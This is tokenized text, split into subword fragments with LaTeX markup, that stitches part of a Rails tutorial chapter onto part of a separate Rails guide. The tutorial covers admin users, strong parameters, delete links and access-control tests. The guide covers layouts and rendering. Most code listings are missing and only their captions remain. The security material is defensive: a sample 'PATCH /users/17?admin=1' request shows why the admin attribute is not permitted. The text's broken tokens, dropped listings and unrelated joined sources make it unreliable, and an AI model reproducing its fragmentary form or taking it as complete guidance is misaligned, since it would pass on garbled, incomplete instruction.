▁Because ▁our ▁code ▁is ▁well - test ed , ▁we ▁can ▁refactor ▁with ▁confidence , ▁as s ur ed ▁that ▁we ▁are ▁unlike ly ▁to ▁break ▁our ▁site ' s ▁functionality .
▁The ▁first ▁step ▁in ▁our ▁refactoring ▁is ▁to ▁replace ▁the ▁user ~\ k ode { li } ▁from ▁Listing ~\ ref { code : will _ paginate _ index _ view } ▁with ▁a ▁\ k ode { render } ▁call ▁( Listing ~\ ref { code : index _ view _ first _ refactoring }).
▁The ▁first ▁refactoring ▁attempt ▁in ▁the ▁index ▁view .
▁The ▁name ▁\ k ode { user } ▁is ▁imm ate rial --- we ▁could ▁have ▁written ▁\ k ode {@ users . each ▁do ▁| foobar | } ▁and ▁the n ▁used ▁\ k ode { render ▁ foobar }.
▁The ▁key ▁is ▁the ▁\ emph { class } ▁of ▁the ▁object --- in ▁this ▁case , ▁\ k ode { User }.
▁A ▁partial ▁to ▁render ▁a ▁single ▁user .
▁This ▁is ▁a ▁defin ite ▁improve ment , ▁but ▁we ▁can ▁do ▁even ▁better : ▁we ▁can ▁call ▁\ k ode { render } ▁\ emph { directly } ▁on ▁the ▁\ k ode {@ users } ▁variable ▁( Listing ~\ ref { code : index _ final _ refactoring }).
▁The ▁fully ▁ refactored ▁users ▁index .
▁The ▁result ▁is ▁the ▁i mp re s s ive ly ▁compact ▁code ▁in ▁Listing ~\ ref { code : index _ final _ refactoring }.
▁As ▁with ▁any ▁refactoring , ▁you ▁should ▁verify ▁that ▁the ▁test ▁suite ▁is ▁ still ▁\ passing \ ▁after ▁changing ▁the ▁application ▁code :
▁Now ▁that ▁the ▁users ▁index ▁is ▁complete , ▁there ' s ▁only ▁one ▁canonical ▁REST ▁action ▁left : ▁\ k ode { destroy }.
▁In ▁this ▁section , ▁we ' ll ▁add ▁links ▁to ▁delete ▁users , ▁as ▁mock ed ▁up ▁in ▁F igure ~\ ref { fig : user _ index _ delete _ links _ mockup }, ▁and ▁define ▁the ▁\ k ode { destroy } ▁action ▁necessary ▁to ▁accomplish ▁the ▁deletion .
▁But ▁first , ▁we ' ll ▁create ▁the ▁class ▁of ▁ administrative ▁users , ▁or ▁\ emph { admin s }, ▁authoriz ed ▁to ▁do ▁so .
▁A ▁mockup ▁of ▁the ▁users ▁index ▁with ▁delete ▁links .
▁\ label { fig : user _ index _ delete _ links _ mockup } }< n >\ end { figure }< n >< n > ▁\ subsection { Admin ist ra tive ▁users } ▁% ▁( fold )< n > ▁\ label { sec : administrative _ users }< n >< n >
▁We ▁will ▁identify ▁privilege d ▁ administrative ▁users ▁with ▁a ▁boolean ▁\ k ode { admin } ▁attribute ▁in ▁the ▁User ▁model , ▁which ▁will ▁lead ▁automatically ▁to ▁an ▁\ k ode { admin ?}\ ▁boolean ▁method ▁to ▁test ▁for ▁admin ▁status .
▁The ▁result ing ▁data ▁model ▁appears ▁in ▁F igure ~\ ref { fig : user _ model _ admin }.
▁The ▁User ▁model ▁with ▁an ▁added ▁\ k ode { admin } ▁boolean ▁attribute .
▁The ▁migration ▁add s ▁the ▁\ k ode { admin } ▁column ▁to ▁the ▁\ k ode { users } ▁table , ▁as ▁show n ▁in ▁Listing ~\ ref { code : admin _ migration }.
▁Note ▁that ▁we ' ve ▁added ▁the ▁argument ▁\ k ode { default : ▁false } ▁to ▁\ k ode { add \_ column } ▁in ▁Listing ~\ ref { code : admin _ migration }, ▁which ▁means ▁that ▁users ▁will ▁\ emph { not } ▁be ▁administrator s ▁by ▁default .
▁( With out ▁the ▁\ k ode { default : ▁false } ▁argument , ▁\ k ode { admin } ▁will ▁be ▁\ k ode { nil } ▁by ▁default , ▁which ▁is ▁ still ▁\ k ode { false }, ▁so ▁this ▁step ▁is ▁not ▁ str ic t ly ▁necessary .
▁It ▁is ▁more ▁explicit , ▁though , ▁and ▁communicat es ▁our ▁in t ent ion s ▁more ▁clear ly ▁both ▁to ▁Rails ▁and ▁to ▁readers ▁of ▁our ▁code .)
▁The ▁migration ▁to ▁add ▁a ▁boolean ▁\ k ode { admin } ▁attribute ▁to ▁users .
▁Next , ▁we ▁ migrate ▁as ▁usual :
▁As ▁expected , ▁Rails ▁ figures ▁out ▁the ▁boolean ▁nature ▁of ▁the ▁\ k ode { admin } ▁attribute ▁and ▁automatically ▁add s ▁the ▁question - m ar k ▁method ▁\ k ode { admin ? } :
▁Here ▁we ' ve ▁used ▁the ▁\ k ode { t ogg le ! } \ ▁method ▁to ▁f li p ▁the ▁\ k ode { admin } ▁attribute ▁from ▁\ k ode { false } ▁to ▁\ k ode { true }.
▁As ▁a ▁final ▁step , ▁let ' s ▁update ▁our ▁see d ▁data ▁to ▁make ▁the ▁first ▁user ▁an ▁admin ▁by ▁default ▁( Listing ~\ ref { code : p o p ul at or _ with _ admin }).
▁The ▁see d ▁data ▁code ▁with ▁an ▁admin ▁user .
▁Then ▁reset ▁the ▁database :
▁Re visit ing ▁ strong ▁parameters
▁You ▁m ight ▁have ▁notice d ▁that ▁Listing ~\ ref { code : p o p ul at or _ with _ admin } ▁make s ▁the ▁user ▁an ▁admin ▁by ▁including ▁\ k ode { admin : ▁true } ▁in ▁the ▁initialization ▁hash .
▁This ▁ underscore s ▁the ▁ danger ▁of ▁ ex p o s ing ▁our ▁objects ▁to ▁the ▁ w il d ▁Web : ▁if ▁we ▁simply ▁passed ▁an ▁initialization ▁hash ▁in ▁from ▁an ▁arbitrar y ▁web ▁request , ▁a ▁ malicious ▁user ▁could ▁send ▁a ▁\ text tt { PATCH } ▁request ▁as ▁follows
▁Co m m and - line ▁tool s ▁such ▁as ▁\ text tt { curl } ▁can ▁issue ▁\ text tt { PATCH } ▁requests ▁of ▁this ▁form .
▁ patch ▁/ users / 17 ?
▁admin = 1
▁This ▁request ▁would ▁make ▁user ▁ 17 ▁an ▁admin , ▁which ▁would ▁be ▁a ▁ potentially ▁serious ▁security ▁ br each .
▁Because ▁of ▁this ▁ danger , ▁it ▁is ▁essential ▁that ▁we ▁only ▁update ▁attributes ▁that ▁are ▁safe ▁to ▁edit ▁through ▁the ▁web .
▁As ▁noted ▁in ▁Section ~\ ref { sec : strong _ parameters }, ▁this ▁is ▁accomplish ed ▁using ▁\ emph { strong ▁parameters } ▁by ▁calling ▁\ k ode { require } ▁and ▁\ k ode { permit } ▁on ▁the ▁\ k ode { params } ▁hash :
▁Note ▁in ▁particular ▁that ▁\ k ode { admin } ▁is ▁\ emph { not } ▁in ▁the ▁list ▁of ▁ permitted ▁attributes .
▁This ▁is ▁what ▁prevent s ▁arbitrar y ▁users ▁from ▁gra n ting ▁themselves ▁ administrative ▁access ▁to ▁our ▁application .
▁Because ▁of ▁its ▁ import ance , ▁it ' s ▁a ▁good ▁idea ▁to ▁write ▁a ▁test ▁for ▁any ▁attribute ▁that ▁is n ' t ▁edit able , ▁and ▁writing ▁such ▁a ▁test ▁for ▁the ▁\ k ode { admin } ▁attribute ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : updating _ deleting _ exercises }).
▁The ▁final ▁step ▁needed ▁to ▁complete ▁the ▁Users ▁resource ▁is ▁to ▁add ▁delete ▁links ▁and ▁a ▁\ k ode { destroy } ▁action .
▁We ' ll ▁start ▁by ▁adding ▁a ▁delete ▁link ▁for ▁each ▁user ▁on ▁the ▁users ▁index ▁page , ▁restrict ing ▁access ▁to ▁ administrative ▁users .
▁The ▁result ing ▁\ k ode {" delete "} ▁links ▁will ▁be ▁displayed ▁only ▁if ▁the ▁current ▁user ▁is ▁an ▁admin ▁( Listing ~\ ref { code : delete _ links }).
▁User ▁delete ▁links ▁( view able ▁only ▁by ▁admin s ).
▁Note ▁the ▁\ k ode { method : ▁: delete } ▁argument , ▁which ▁arrange s ▁for ▁the ▁link ▁to ▁issue ▁the ▁necessary ▁\ text tt { DELETE } ▁request . ▁We ' ve ▁also ▁wrapp ed ▁each ▁link ▁inside ▁an ~\ k ode { if } ▁statement ▁so ▁that ▁only ▁admin s ▁can ▁see ▁them .
▁The ▁result ▁for ▁our ▁admin ▁user ▁appears ▁in ▁F igure ~\ ref { fig : index _ delete _ links _ rails _3} .
▁Web ▁browsers ▁can ' t ▁send ▁\ text tt { DELETE } ▁requests ▁native ly , ▁so ▁Rails ▁fake s ▁them ▁with ▁JavaScript .
▁This ▁means ▁that ▁the ▁delete ▁links ▁won ' t ▁work ▁if ▁the ▁user ▁has ▁JavaScript ▁disable d .
▁If ▁you ▁must ▁support ▁non - JavaScript - en able d ▁browsers ▁you ▁can ▁fake ▁a ▁\ text tt { DELETE } ▁request ▁using ▁a ▁form ▁and ▁a ▁\ text tt { POST } ▁request , ▁which ▁works ▁even ▁without ▁JavaScript
▁See ▁the ▁ RailsCast ▁on ▁`` \ href { http :// r ailscasts . com / episodes / 7 7 - destroy - with out - javascript }{ Destroy ▁With out ▁JavaScript } '' ▁for ▁details .
▁The ▁users ▁index ▁with ▁delete ▁links .
▁To ▁get ▁the ▁delete ▁links ▁to ▁work , ▁we ▁need ▁to ▁add ▁a ▁\ k ode { destroy } ▁action ▁( Table ~\ ref { table : RESTful _ users }), ▁which ▁find s ▁the ▁corresponding ▁user ▁and ▁destroy s ▁it ▁with ▁the ▁Active ▁Record ▁\ k ode { destroy } ▁method , ▁finally ▁redirect ing ▁to ▁the ▁users ▁index , ▁as ▁seen ▁in ▁Listing ~\ ref { code : destroy _ action }.
▁Because ▁users ▁have ▁to ▁be ▁logged ▁in ▁to ▁delete ▁users , ▁Listing ~\ ref { code : destroy _ action } ▁also ▁add s ▁\ k ode { : destroy } ▁to ▁the ▁\ k ode { logged \_ in \_ user } ▁before ▁filter .
▁ Adding ▁a ▁working ▁\ k ode { destroy } ▁action .
▁Note ▁that ▁the ▁\ k ode { destroy } ▁action ▁uses ▁method ▁chain ing ▁to ▁combine ▁the ▁\ k ode { find } ▁and ▁\ k ode { destroy } ▁into ▁one ▁line :
▁As ▁construct ed , ▁only ▁admin s ▁can ▁destroy ▁users ▁through ▁the ▁web ▁since ▁only ▁they ▁can ▁see ▁the ▁delete ▁links , ▁but ▁there ' s ▁ still ▁a ▁terribl e ▁security ▁hole : ▁any ▁ s u ff ic i ent ly ▁sophisticat ed ▁attacker ▁could ▁simply ▁issue ▁a ▁\ text tt { DELETE } ▁request ▁directly ▁from ▁the ▁command ▁line ▁to ▁delete ▁any ▁user ▁on ▁the ▁site .
▁To ▁secure ▁the ▁site ▁properly , ▁we ▁also ▁need ▁access ▁control ▁on ▁the ▁\ k ode { destroy } ▁action , ▁so ▁that ▁\ emph { only } ▁admin s ▁can ▁delete ▁users .
▁As ▁in ▁Section ~\ ref { sec : requiring _ logged _ in _ users } ▁and ▁Section ~\ ref { sec : requiring _ the _ right _ user }, ▁we ' ll ▁enforce ▁access ▁control ▁using ▁a ▁before ▁filter , ▁this ▁time ▁to ▁restrict ▁access ▁to ▁the ▁\ k ode { destroy } ▁action ▁to ▁admin s .
▁The ▁result ing ▁\ k ode { admin \_ user } ▁before ▁filter ▁appears ▁in ▁Listing ~\ ref { code : admin _ destroy _ before _ filter }.
▁A ▁before ▁filter ▁restrict ing ▁the ▁\ k ode { destroy } ▁action ▁to ▁admin s .
▁# ▁Co n fi rm s ▁an ▁admin ▁user .
▁With ▁something ▁as ▁ danger ous ▁as ▁destroying ▁users , ▁it ' s ▁important ▁to ▁have ▁good ▁tests ▁for ▁the ▁expected ▁behavior .
▁We ▁start ▁by ▁a r ra n g ing ▁for ▁one ▁of ▁our ▁fixture ▁users ▁to ▁be ▁an ▁admin , ▁as ▁show n ▁in ▁Listing ~\ ref { code : fixture _ user _ admin }.
▁Mak ing ▁one ▁of ▁the ▁fixture ▁users ▁an ▁admin .
▁Follow ing ▁the ▁practice ▁from ▁Section ~\ ref { sec : requiring _ logged _ in _ users }, ▁we ' ll ▁put ▁action - level ▁tests ▁of ▁access ▁control ▁in ▁the ▁Users ▁controller ▁test ▁file .
▁As ▁with ▁the ▁ logout ▁test ▁in ▁Listing ~\ ref { code : user _ logout _ test }, ▁we ' ll ▁use ▁\ k ode { delete } ▁to ▁issue ▁a ▁\ text tt { DELETE } ▁request ▁directly ▁to ▁the ▁\ k ode { destroy } ▁action .
▁We ▁need ▁to ▁check ▁two ▁cases : ▁first , ▁users ▁who ▁are n ' t ▁logged ▁in ▁should ▁be ▁redirect ed ▁to ▁the ▁login ▁page ; ▁second , ▁users ▁who ▁are ▁logged ▁in ▁but ▁who ▁are n ' t ▁admin s ▁should ▁be ▁redirect ed ▁to ▁the ▁Home ▁page .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : action _ tests _ admin }
▁Action - level ▁tests ▁for ▁admin ▁access ▁control .
▁Note ▁that ▁Listing ~\ ref { code : action _ tests _ admin } ▁also ▁make s ▁sure ▁that ▁the ▁user ▁count ▁does n ' t ▁change ▁using ▁the ▁\ k ode { assert \_ no \_ difference } ▁method ▁( see n ▁before ▁in ▁Listing ~\ ref { code : a _ test _ for _ invalid _ submission }).
▁The ▁tests ▁in ▁Listing ~\ ref { code : action _ tests _ admin } ▁verify ▁the ▁behavior ▁in ▁the ▁case ▁of ▁an ▁un authorize d ▁( n on - admin ) ▁user , ▁but ▁we ▁also ▁want ▁to ▁check ▁that ▁an ▁admin ▁can ▁use ▁a ▁delete ▁link ▁to ▁successfully ▁destroy ▁a ▁user .
▁S ince ▁the ▁delete ▁links ▁appear ▁on ▁the ▁users ▁index , ▁we ' ll ▁add ▁these ▁tests ▁to ▁the ▁users ▁index ▁test ▁from ▁Listing ~\ ref { code : user _ index _ test }.
▁The ▁only ▁really ▁trick y ▁part ▁is ▁verify ing ▁that ▁a ▁user ▁get s ▁deleted ▁when ▁an ▁admin ▁click s ▁on ▁a ▁delete ▁link , ▁which ▁we ' ll ▁accomplish ▁as ▁follows :
▁P utting ▁everything ▁together ▁gives ▁the ▁pagination ▁and ▁delete ▁test ▁in ▁Listing ~\ ref { code : delete _ link _ integration _ test }, ▁which ▁includes ▁tests ▁for ▁both ▁admin s ▁and ▁non - admin s .
▁An ▁integration ▁test ▁for ▁delete ▁links ▁and ▁destroying ▁users .
▁Note ▁that ▁Listing ~\ ref { code : delete _ link _ integration _ test } ▁check s ▁for ▁the ▁right ▁delete ▁links , ▁including ▁skip p ing ▁the ▁test ▁if ▁the ▁user ▁happens ▁to ▁be ▁the ▁admin ▁( which ▁ la c k s ▁a ▁delete ▁link ▁due ▁to ▁Listing ~\ ref { code : delete _ links }).
▁At ▁this ▁point , ▁our ▁deletion ▁code ▁is ▁well - test ed , ▁and ▁the ▁test ▁suite ▁should ▁be ▁\ passing :
▁We ' ve ▁come ▁a ▁long ▁way ▁since ▁introduc ing ▁the ▁Users ▁controller ▁way ▁back ▁in ▁Section ~\ ref { sec : user _ signup }.
▁Those ▁users ▁could n ' t ▁even ▁sign ▁up ; ▁now ▁users ▁can ▁sign ▁up , ▁log ▁in , ▁log ▁out , ▁view ▁their ▁profile s , ▁edit ▁their ▁settings , ▁and ▁see ▁an ▁index ▁of ▁all ▁users --- and ▁some ▁can ▁even ▁destroy ▁other ▁users .
▁As ▁it ▁present ly ▁stand s , ▁the ▁sample ▁application ▁forms ▁a ▁so li d ▁foundation ▁for ▁any ▁website ▁requiring ▁users ▁with ▁authentication ▁and ▁authorization .
▁In ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset }, ▁we ' ll ▁add ▁two ▁ additional ▁refinement s : ▁an ▁account ▁activation ▁link ▁for ▁new ly ▁registered ▁users ▁( ve r ify ing ▁a ▁valid ▁email ▁address ▁in ▁the ▁process ) ▁and ▁password ▁resets ▁to ▁help ▁users ▁who ▁ forget ▁their ▁passwords .
▁Before ▁mov ing ▁on , ▁be ▁sure ▁to ▁merge ▁all ▁the ▁changes ▁into ▁the ▁master ▁branch :
▁You ▁can ▁also ▁deploy ▁the ▁application ▁and ▁even ▁ populate ▁the ▁production ▁database ▁with ▁sample ▁users ▁( using ▁the ▁\ k ode { p g : reset } ▁task ▁to ▁reset ▁the ▁production ▁database ) :
▁Of ▁course , ▁on ▁a ▁real ▁site ▁you ▁ probably ▁would n ' t ▁want ▁to ▁see d ▁it ▁with ▁sample ▁data , ▁but ▁I ▁include ▁it ▁here ▁for ▁purposes ▁of ▁i ll u str ation ▁( F igure ~\ ref { fig : heroku _ sample _ users }).
▁In cidentally , ▁the ▁order ▁of ▁the ▁sample ▁users ▁in ▁F igure ~\ ref { fig : heroku _ sample _ users } ▁may ▁var y , ▁and ▁on ▁my ▁system ▁does n ' t ▁match ▁the ▁local ▁version ▁from ▁F igure ~\ ref { fig : user _ index _ pagination } ; ▁this ▁is ▁because ▁we ▁have n ' t ▁specified ▁a ▁default ▁order ing ▁for ▁users ▁when ▁retrieved ▁from ▁the ▁database , ▁so ▁the ▁current ▁order ▁is ▁database - dependent .
▁This ▁does n ' t ▁matter ▁much ▁for ▁users , ▁but ▁it ▁will ▁for ▁microposts , ▁and ▁we ' ll ▁address ▁this ▁issue ▁further ▁in ▁Section ~\ ref { sec : order ing _ and _ dependency }.
▁The ▁sample ▁users ▁in ▁production .
▁\ label { fig : heroku _ sample _ users } }< n >\ end { figure }< n >< n >\ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )< n >\ label { sec : updating _ what _ we _ learned _ in _ this _ chapter }< n >< n >\ begin { item ize }< n >< n >\ item
▁Users ▁can ▁be ▁updated ▁using ▁an ▁edit ▁form , ▁which ▁send s ▁a ▁\ text tt { PATCH } ▁request ▁to ▁the ▁\ k ode { update } ▁action .
▁Safe ▁updating ▁through ▁the ▁web ▁is ▁enforce d ▁using ▁ strong ▁parameters .
▁Before ▁filter s ▁give ▁a ▁standard ▁way ▁to ▁run ▁methods ▁before ▁particular ▁controller ▁actions .
▁We ▁implement ▁an ▁authorization ▁using ▁before ▁filter s .
▁ Auth or i z ation ▁tests ▁use ▁both ▁ low - level ▁commands ▁to ▁submit ▁particular ▁HTTP ▁requests ▁directly ▁to ▁controller ▁actions ▁and ▁high - level ▁integration ▁tests .
▁Fri end ly ▁forwarding ▁redirect s ▁users ▁where ▁they ▁want ed ▁to ▁go ▁after ▁logging ▁in .
▁The ▁users ▁index ▁page ▁shows ▁all ▁users , ▁one ▁page ▁at ▁a ▁time .
▁Rails ▁uses ▁the ▁standard ▁file ▁\ k ode { db / seed s . rb } ▁to ▁see d ▁the ▁database ▁with ▁sample ▁data ▁using ▁\ k ode { rake ▁db : seed }.
▁A ▁boolean ▁attribute ▁\ k ode { admin } ▁on ▁users ▁automatically ▁gives ▁a ▁\ k ode { user . admin ?}\ ▁boolean ▁method .
▁ Admin s ▁can ▁delete ▁users ▁through ▁the ▁web ▁by ▁click ing ▁on ▁delete ▁links ▁that ▁issue ▁\ text tt { DELETE } ▁requests ▁to ▁the ▁Users ▁controller ▁\ k ode { destroy } ▁action .
▁We ▁can ▁create ▁a ▁large ▁number ▁of ▁test ▁users ▁using ▁ embedded ▁Ruby ▁inside ▁fixtures .
▁Writ e ▁a ▁test ▁to ▁make ▁sure ▁that ▁ friendly ▁forwarding ▁only ▁forward s ▁to ▁the ▁given ▁URL ▁the ▁first ▁time .
▁On ▁subsequent ▁login ▁attempt s , ▁the ▁forwarding ▁URL ▁should ▁ r ever t ▁to ▁the ▁default ▁( i . e . , ▁the ▁profile ▁page ).
▁Writ e ▁an ▁integration ▁test ▁for ▁all ▁the ▁layout ▁links , ▁including ▁the ▁proper ▁behavior ▁for ▁logged - in ▁and ▁non - logged - in ▁users .
▁\ emph { Hint } : ▁Add ▁to ▁the ▁test ▁in ▁Listing ~\ ref { code : layout _ links _ test } ▁using ▁the ▁\ k ode { log \_ in \_ as } ▁helper .
▁By ▁is s u ing ▁a ▁\ text tt { PATCH } ▁request ▁directly ▁to ▁the ▁\ k ode { update } ▁method ▁as ▁show n ▁in ▁Listing ~\ ref { code : for b id de n _ admin _ test }, ▁verify ▁that ▁the ▁\ k ode { admin } ▁attribute ▁is n ' t ▁edit able ▁through ▁the ▁web .
▁in ▁Listing ~\ ref { code : new _ user _ with _ partial } ▁and
▁Testing ▁that ▁the ▁\ k ode { admin } ▁attribute ▁is ▁for b id de n .
▁The ▁signup ▁view ▁with ▁partial .
▁This ▁guide ▁cover s ▁the ▁basic ▁layout ▁features ▁of ▁Action ▁Controller ▁and ▁Action ▁View .
▁* ▁How ▁to ▁use ▁the ▁ various ▁rendering ▁methods ▁built ▁into ▁Rails .
▁* ▁How ▁to ▁create ▁layout s ▁with ▁multiple ▁content ▁section s .
▁* ▁How ▁to ▁use ▁partials ▁to ▁ DRY ▁up ▁your ▁views .
▁* ▁How ▁to ▁use ▁nested ▁layout s ▁( sub - template s ).
▁Over view : ▁How ▁the ▁P i ec es ▁F it ▁To get h er
▁This ▁guide ▁focus es ▁on ▁the ▁interact ion ▁between ▁Controller ▁and ▁View ▁in ▁the ▁Model - View - Controller ▁tr i angle .
▁As ▁you ▁know , ▁the ▁Controller ▁is ▁responsib le ▁for ▁or ch est ra ting ▁the ▁whole ▁process ▁of ▁handling ▁a ▁request ▁in ▁Rails , ▁though ▁it ▁normally ▁hand s ▁off ▁any ▁heav y ▁code ▁to ▁the ▁Model .
▁But ▁the n , ▁when ▁it ' s ▁time ▁to ▁send ▁a ▁response ▁back ▁to ▁the ▁user , ▁the ▁Controller ▁hand s ▁things ▁off ▁to ▁the ▁View .
▁It ' s ▁that ▁hand of f ▁that ▁is ▁the ▁subject ▁of ▁this ▁guide .
▁In ▁broad ▁ str o k es , ▁this ▁involve s ▁d ec id ing ▁what ▁should ▁be ▁sent ▁as ▁the ▁response ▁and ▁calling ▁an ▁appropriate ▁method ▁to ▁create ▁that ▁response .
▁If ▁the ▁response ▁is ▁a ▁full - b low n ▁view , ▁Rails ▁also ▁does ▁some ▁extra ▁work ▁to ▁wrap ▁the ▁view ▁in ▁a ▁layout ▁and ▁ possibl y ▁to ▁pull ▁in ▁partial ▁views .
▁You ' ll ▁see ▁all ▁of ▁those ▁paths ▁later ▁in ▁this ▁guide .
▁Creat ing ▁ Response s
▁ From ▁the ▁controller ' s ▁point ▁of ▁view , ▁there ▁are ▁three ▁ways ▁to ▁create ▁an ▁HTTP ▁response :
▁* ▁Call ▁` render ` ▁to ▁create ▁a ▁full ▁response ▁to ▁send ▁back ▁to ▁the ▁browser
▁* ▁Call ▁` redirect _ to ` ▁to ▁send ▁an ▁HTTP ▁redirect ▁status ▁code ▁to ▁the ▁browser
▁* ▁Call ▁` head ` ▁to ▁create ▁a ▁response ▁consist ing ▁so le ly ▁of ▁HTTP ▁headers ▁to ▁send ▁back ▁to ▁the ▁browser
▁### ▁Rendering ▁by ▁Default : ▁Co n v ent ion ▁Over ▁Configuration ▁in ▁Action
▁You ' ve ▁he ar d ▁that ▁Rails ▁pro m o t es ▁" co n v ent ion ▁over ▁configuration ".
▁Default ▁rendering ▁is ▁an ▁excellent ▁example ▁of ▁this .
▁By ▁default , ▁controllers ▁in ▁Rails ▁automatically ▁render ▁views ▁with ▁names ▁that ▁correspond ▁to ▁valid ▁routes .
▁For ▁example , ▁if ▁you ▁have ▁this ▁code ▁in ▁your ▁` Book sController ` ▁class :
▁class ▁ Book sController ▁< ▁Application Controller
▁And ▁the ▁following ▁in ▁your ▁routes ▁file :
▁resources ▁: books
▁And ▁you ▁have ▁a ▁view ▁file ▁` app / views / books / index . html . erb ` :
▁< h 1> Book s ▁are ▁com ing ▁soon !
▁Rails ▁will ▁automatically ▁render ▁` app / views / books / index . html . erb ` ▁when ▁you ▁navigate ▁to ▁` / books ` ▁and ▁you ▁will ▁see ▁" Book s ▁are ▁com ing ▁soon !" ▁on ▁your ▁screen .
▁However ▁a ▁com ing ▁soon ▁screen ▁is ▁only ▁minimal ly ▁useful , ▁so ▁you ▁will ▁soon ▁create ▁your ▁` Book ` ▁model ▁and ▁add ▁the ▁index ▁action ▁to ▁` Book sController ` :
▁@ books ▁= ▁ Book . all
▁Note ▁that ▁we ▁don ' t ▁have ▁explicit ▁render ▁at ▁the ▁end ▁of ▁the ▁index ▁action ▁in ▁a cc or d ance ▁with ▁" co n v ent ion ▁over ▁configuration " ▁principle .
▁The ▁rule ▁is ▁that ▁if ▁you ▁do ▁not ▁explicitly ▁render ▁something ▁at ▁the ▁end ▁of ▁a ▁controller ▁action , ▁Rails ▁will ▁automatically ▁look ▁for ▁the ▁` action _ name . html . erb ` ▁template ▁in ▁the ▁controller ' s ▁view ▁path ▁and ▁render ▁it .
▁So ▁in ▁this ▁case , ▁Rails ▁will ▁render ▁the ▁` app / views / books / index . html . erb ` ▁file .
▁If ▁we ▁want ▁to ▁display ▁the ▁ properties ▁of ▁all ▁the ▁book s ▁in ▁our ▁view , ▁we ▁can ▁do ▁so ▁with ▁an ▁ERB ▁template ▁like ▁this :
▁< h 1> Listing ▁ Book s </ h 1>
▁< th > S um m ary </ th >
▁< th ></ th >
▁<% ▁@ books . each ▁do ▁| book | ▁%>
▁< td > <%= ▁book . title ▁%></ td >
▁< td > <%= ▁book . content ▁%></ td >
▁< td > <%= ▁link _ to ▁" S how ", ▁book ▁%></ td >
▁< td > <%= ▁link _ to ▁" Edit ", ▁edit _ book _ path ( book ) ▁%></ td >
▁< td > <%= ▁link _ to ▁" Re m o ve ", ▁book , ▁method : ▁: delete , ▁data : ▁ { ▁confirm : ▁" A re ▁you ▁sure ? "
▁<%= ▁link _ to ▁" New ▁book ", ▁new _ book _ path ▁%>
▁NOTE : ▁The ▁actual ▁rendering ▁is ▁done ▁by ▁ subclasses ▁of ▁` ActionView :: Template H and ler s `.
▁This ▁guide ▁does ▁not ▁d ig ▁into ▁that ▁process , ▁but ▁it ' s ▁important ▁to ▁know ▁that ▁the ▁file ▁extension ▁on ▁your ▁view ▁control s ▁the ▁choice ▁of ▁template ▁handle r .
▁B eginning ▁with ▁Rails ▁2, ▁the ▁standard ▁extensions ▁are ▁` . erb ` ▁for ▁ERB ▁( HTML ▁with ▁ embedded ▁Ruby ), ▁and ▁` . builder ` ▁for ▁ Builder ▁( X ML ▁generator ).
▁### ▁Using ▁` render `
▁In ▁most ▁cases , ▁the ▁` ActionController :: Base # render ` ▁method ▁does ▁the ▁heav y ▁ li f ting ▁of ▁rendering ▁your ▁application ' s ▁content ▁for ▁use ▁by ▁a ▁browser .
▁There ▁are ▁a ▁variety ▁of ▁ways ▁to ▁customize ▁the ▁behavior ▁of ▁` render `.
▁You ▁can ▁render ▁the ▁default ▁view ▁for ▁a ▁Rails ▁template , ▁or ▁a ▁specific ▁template , ▁or ▁a ▁file , ▁or ▁in line ▁code , ▁or ▁nothing ▁at ▁all .
▁You ▁can ▁render ▁text , ▁JSON , ▁or ▁ X ML .
▁You ▁can ▁specify ▁the ▁content ▁type ▁or ▁HTTP ▁status ▁of ▁the ▁rendered ▁response ▁as ▁well .
▁TIP : ▁If ▁you ▁want ▁to ▁see ▁the ▁exact ▁results ▁of ▁a ▁call ▁to ▁` render ` ▁without ▁need ing ▁to ▁ inspect ▁it ▁in ▁a ▁browser , ▁you ▁can ▁call ▁` render _ to _ string `.
▁This ▁method ▁take s ▁exactly ▁the ▁same ▁options ▁as ▁` render `, ▁but ▁it ▁returns ▁a ▁string ▁instead ▁of ▁sending ▁a ▁response ▁back ▁to ▁the ▁browser .
▁#### ▁Rendering ▁No th ing
▁P erhaps ▁the ▁simplest ▁thing ▁you ▁can ▁do ▁with ▁` render ` ▁is ▁to ▁render ▁nothing ▁at ▁all :
▁render ▁nothing : ▁true
▁If ▁you ▁look ▁at ▁the ▁response ▁for ▁this ▁using ▁c URL , ▁you ▁will ▁see ▁the ▁following :
▁ $ ▁ curl ▁- i ▁1 27 . 0 . 0 . 1 :3000/ books
▁HTTP /1.1 ▁200 ▁O K
▁ Connection : ▁close
▁Date : ▁Sun , ▁24 ▁Jan ▁2010 ▁09 : 2 5 : 18 ▁GMT
▁ Content - Type : ▁* / * ; ▁ cha r set = u t f -8
▁ X - Runtime : ▁0.0 1 4 2 9 7
▁Set - Co o k i e : ▁ _ blog _ session = . . . s n ip . . . ; ▁path = / ; ▁ Http O n ly
▁ Cache - Control : ▁no - cache
▁We ▁see ▁there ▁is ▁an ▁empty ▁response ▁( no ▁data ▁after ▁the ▁` Cache - Control ` ▁line ), ▁but ▁the ▁request ▁was ▁successful ▁because ▁Rails ▁has ▁set ▁the ▁response ▁to ▁200 ▁O K . ▁You ▁can ▁set ▁the ▁`: status ` ▁option ▁on ▁render ▁to ▁change ▁this ▁response .
▁Rendering ▁nothing ▁can ▁be ▁useful ▁for ▁Ajax ▁requests ▁where ▁all ▁you ▁want ▁to ▁send ▁back ▁to ▁the ▁browser ▁is ▁an ▁a c knowledg ment ▁that ▁the ▁request ▁was ▁complete d .
▁TIP : ▁You ▁should ▁ probably ▁be ▁using ▁the ▁` head ` ▁method , ▁discuss ed ▁later ▁in ▁this ▁guide , ▁instead ▁of ▁` render ▁: not h ing `.
▁This ▁provides ▁ additional ▁flexibility ▁and ▁make s ▁it ▁explicit ▁that ▁you ' re ▁only ▁ generating ▁HTTP ▁headers .
▁#### ▁Rendering ▁an ▁Action ' s ▁View
▁If ▁you ▁want ▁to ▁render ▁the ▁view ▁that ▁correspond s ▁to ▁a ▁different ▁template ▁within ▁the ▁same ▁controller , ▁you ▁can ▁use ▁` render ` ▁with ▁the ▁name ▁of ▁the ▁view :
▁@ book ▁= ▁ Book . find ( params [: id ])
▁if ▁@ book . update ( book _ params )
▁redirect _ to (@ book )
▁render ▁" edit "
▁If ▁the ▁call ▁to ▁` update ` ▁fails , ▁calling ▁the ▁` update ` ▁action ▁in ▁this ▁controller ▁will ▁render ▁the ▁` edit . html . erb ` ▁template ▁ belonging ▁to ▁the ▁same ▁controller .
